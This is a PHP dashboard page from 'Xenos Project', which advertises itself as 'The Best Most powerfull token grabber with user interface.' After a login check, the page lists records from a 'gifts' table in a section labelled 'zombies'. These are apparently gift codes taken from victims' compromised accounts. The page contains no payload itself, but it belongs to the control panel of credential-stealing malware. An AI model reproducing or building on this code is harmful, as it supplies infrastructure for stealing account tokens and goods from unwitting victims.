<?php

    require_once('Inc/fonctions.php');

    if(!CheckLogin()){
        header('Location: login');
    }


    $title = "Gifts";
    require('Inc/Dash.php');
?>
    <!-- Main -->
    <section class="section_main">
        <div class="main">
            <img src="assets/images/xenos.gif" alt="">
            <h1>Xenos Project</h1>
            <p>The Best Most powerfull token grabber with user interface.</p>
        </div>
    </section>

    <section class="section_zombies">
        <div id="zombies" class="zombies">
            <?php
                global $bdd;
                $resp = $bdd->query('SELECT * FROM gifts');                
                while ($gift = $resp->fetch()) {
            ?>
                <div class="gift">
                    <span><?=$gift["gift_name"];?></span>
                    <p><?=$gift["code"];?></p>
                </div>

            <?php } ?>
        </div>
    </section>

    <footer>
        Copyright ©️ Made By <a target="_blank" href="https://github.com/KanekiWeb">Kaneki Web</a>
    </footer>

    <script src="assets/js/filter.js"></script>

</body>
</html>